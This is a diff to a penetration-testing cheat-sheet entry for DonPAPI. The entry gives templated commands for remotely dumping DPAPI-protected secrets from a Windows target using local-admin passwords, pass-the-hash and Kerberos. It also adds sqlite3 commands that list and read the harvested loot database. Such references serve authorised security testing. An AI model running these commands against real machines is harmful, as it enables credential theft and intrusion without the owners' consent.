@@ -2,25 +2,36 @@
 
 % DonPAPI, dpapi
 
-#plateform/linux  #target/remote  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
+#plateform/linux  #target/remote  #cat/CREDENTIAL-ACCESS/DPAPI
 
-## DonPAPI - Dump all secrets of the target machine with Local Admin
-```
-DonPAPI -local_auth <user>@<target>
+## list gathered
+```bash
+sqlite3  -readonly donpapi.db -cmd '.tables' ".exit"
 ```
 
-## DonPAPI - Dump all secrets of the target machine with Local Admin (creds)
+## count gathered
+```bash
+sqlite3  -readonly donpapi.db -cmd 'select count(1) from <table>;' ".exit"
 ```
-DonPAPI <domain>/<user>:<password>@<target>
+
+## show gathered
+```bash
+sqlite3  -readonly donpapi.db -cmd 'select * from <table>;' ".exit"
 ```
-## DonPAPI - Dump all secrets of the target machine with Local Admin (kerberos)
+
+## Dump all secrets (localadmin creds)
+```
+DonPAPI <target>/<user>:<password>@<target>
+```
+
+## DonPAPI - Dump all secrets (localadmin pth)
+```
+DonPAPI --hashes :<NT> <target>/<user>@<target>
+```
+
+## Dump all secrets (kerberos)
 ```
 DonPAPI -k <domain>/<user>@<target>
-```
-
-## DonPAPI - Dump all secrets of the target machine with Local Admin (pth)
-```
-DonPAPI --hashes <LM>:<NT> <domain>/<user>@<target>
 ```
 
 
